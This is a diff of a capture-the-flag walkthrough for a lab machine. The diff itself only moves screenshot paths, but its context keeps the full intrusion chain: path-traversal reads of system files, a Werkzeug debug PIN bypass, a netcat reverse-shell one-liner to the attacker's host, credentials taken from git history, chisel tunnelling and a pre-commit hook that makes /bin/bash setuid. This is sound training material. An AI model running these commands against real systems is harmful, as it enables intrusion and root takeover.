@@ -133,23 +133,23 @@ curl -i http://10.10.11.164/
 
 - `Download` â†’ retrieves a file `source.zip`  
 
-![source_downloaded](source_downloaded.png)
+![source_downloaded](screenshots/source_downloaded.png)
 
 - `Take me there!` â†’ redirects to `/uplcloud` (file upload interface)  
   
-![web_upcloud](web_upcloud.png)
+![web_upcloud](screenshots/web_upcloud.png)
 
 Testing file upload with `test.txt`:
 
-![web_upcloud_test](web_upcloud_test.png)
+![web_upcloud_test](screenshots/web_upcloud_test.png)
 
 Tap in `file`:
 
-![web_test](web_test.png)
+![web_test](screenshots/web_test.png)
 
 Attempting **SSTI** with `{{7*7}}` fails:
 
-![web_7_ssti](web_7_ssti.png)
+![web_7_ssti](screenshots/web_7_ssti.png)
 
 ### 2.3 Fuzzing for Hidden Directories
 
@@ -163,13 +163,13 @@ wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-
 
 Discovered **/console** endpoint, a Werkzeug debugger console:
 
-![web_console](web_console.png)
+![web_console](screenshots/web_console.png)
 
 ### 2.4 Local File Inclusion via Upload Bypass
 
 Analysis of `utils.py` from **source.zip** file downloaded shows path sanitization in `./`: 
 
-![source_utils](source_utils.png)
+![source_utils](screenshots/source_utils.png)
 
 But bypassable with `..//`.
 
@@ -177,7 +177,7 @@ But bypassable with `..//`.
 curl http://10.10.11.164/uploads/..//etc/passwd --path-as-is
 ```
 
-![curl_etc_passwd](curl_etc_passwd.png)
+![curl_etc_passwd](screenshots/curl_etc_passwd.png)
 
 ---
 ## 3. Foothold
@@ -188,35 +188,35 @@ Following HackTricks methodology, required values were extracted:
 
 - Username: `root`  
 - Flask app path discovered via BurpSuite:  
-![burpsuite_path](burpsuite_path.png)
+![burpsuite_path](screenshots/burpsuite_path.png)
 - MAC address â†’ converted to decimal:  
   ```bash
   curl http://10.10.11.164/uploads/..//sys/class/net/eth0/address --path-as-is
   ```
-![curl_mac_address](curl_mac_address.png)
-![python_mac_decimal](python_mac_decimal.png)
+![curl_mac_address](screenshots/curl_mac_address.png)
+![python_mac_decimal](screenshots/python_mac_decimal.png)
 - Boot ID:  
   ```bash
   curl http://10.10.11.164/uploads/..//proc/sys/kernel/random/boot_id --path-as-is --ignore-content-length
   ```
-![curl_boot_id](curl_boot_id.png)
+![curl_boot_id](screenshots/curl_boot_id.png)
 - Cgroup:  
   ```bash
   curl http://10.10.11.164/uploads/..//proc/self/cgroup --path-as-is --ignore-content-length
   ```
-![curl_cgroup](curl_cgroup.png)
+![curl_cgroup](screenshots/curl_cgroup.png)
 
 PIN generated successfully:
 
-![generate_pin_executed](generate_pin_executed.png)
+![generate_pin_executed](screenshots/generate_pin_executed.png)
 
 Access granted to console:
 
-![web_console_login](web_console_login.png)
+![web_console_login](screenshots/web_console_login.png)
 
 Continue the attack chain with the next commands:
 
-![web_console_whoami](web_console_whoami.png)
+![web_console_whoami](screenshots/web_console_whoami.png)
 
 ### 3.2 Remote Shell
 
@@ -226,11 +226,11 @@ Spawn a reverse shell from the Werkzeug debug console using a one-liner **Python
 os.popen("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.10 443").read().strip()
 ```
 
-![web_console_send_bash](web_console_send_bash.png)
+![web_console_send_bash](screenshots/web_console_send_bash.png)
 
 Gained shell inside **Docker container**:
 
-![container](container.png)
+![container](screenshots/container.png)
 
 ### 3.3 Investigating Git Repository
 
@@ -243,10 +243,10 @@ git log dev
 git show a76f8f75f7a4a12b706b0cf9c983796fa1985820
 ```
 
-![git_log_public](git_log_public.png)
-![git_branch](git_branch.png)
-![git_log_dev](git_log_dev.png)
-![git_show_credentials](git_show_credentials.png)
+![git_log_public](screenshots/git_log_public.png)
+![git_branch](screenshots/git_branch.png)
+![git_log_dev](screenshots/git_log_dev.png)
+![git_show_credentials](screenshots/git_show_credentials.png)
 
 Credentials found:  
 `dev01:Soulless_Developer#2022`
@@ -259,7 +259,7 @@ Map listening ports from inside the container and reach the internal service:
 nmap -p- -sS --min-rate 5000 -vvv -n -Pn 10.10.11.164
 ```
 
-![nmap_filtered_ports](nmap_filtered_ports.png)
+![nmap_filtered_ports](screenshots/nmap_filtered_ports.png)
 
 Discovered **port 3000**. From container:
 
@@ -269,8 +269,8 @@ ping -c 1 172.17.0.1
 wget http://172.17.0.1:3000/ -qO-
 ```
 
-![container_ip](container_ip.png)
-![gitea](gitea.png)
+![container_ip](screenshots/container_ip.png)
+![gitea](screenshots/gitea.png)
 
 ### 3.5 Remote Port Forwarding with Chisel
 
@@ -283,7 +283,7 @@ python -m http.server
 wget http://10.10.14.10:8000/chisel
 ```
 
-![chisel](chisel.png)
+![chisel](screenshots/chisel.png)
 
 - Attacker as server:
   ```bash
@@ -294,19 +294,19 @@ wget http://10.10.14.10:8000/chisel
   ./chisel client 10.10.14.10:1234 R:3000:172.17.0.1:3000
   ```
 
-![chisel_execute](chisel_execute.png)
+![chisel_execute](screenshots/chisel_execute.png)
 
 Now accessible locally:
 
-![gitea_localhost](gitea_localhost.png)
+![gitea_localhost](screenshots/gitea_localhost.png)
 
 Login with discovered credentials:
 
-![gitea_login](gitea_login.png)
+![gitea_login](screenshots/gitea_login.png)
 
 SSH private key found in repo:
 
-![gitea_id_rsa](gitea_id_rsa.png)
+![gitea_id_rsa](screenshots/gitea_id_rsa.png)
 
 SSH access as `dev01`:
 
@@ -327,8 +327,8 @@ chmod +x pspy64
 ./pspy64
 ```
 
-![git_sync_pspy](git_sync_pspy.png)
-![git_scan_code](git_scan_code.png)
+![git_sync_pspy](screenshots/git_sync_pspy.png)
+![git_scan_code](screenshots/git_scan_code.png)
 
 A cron-executed script performs `git commit` as **root**.
 
@@ -336,7 +336,7 @@ A cron-executed script performs `git commit` as **root**.
 
 Inspecting hooks:
 
-![git_hooks](git_hooks.png)
+![git_hooks](screenshots/git_hooks.png)
 
 Create malicious pre-commit hook:
 
@@ -345,7 +345,7 @@ echo 'chmod u+s /bin/bash' > ~/.git/hooks/pre-commit
 chmod +x ~/.git/hooks/pre-commit 
 ```
 
-![git_hooks_add_bash](git_hooks_add_bash.png)
+![git_hooks_add_bash](screenshots/git_hooks_add_bash.png)
 
 After cron executes:
 
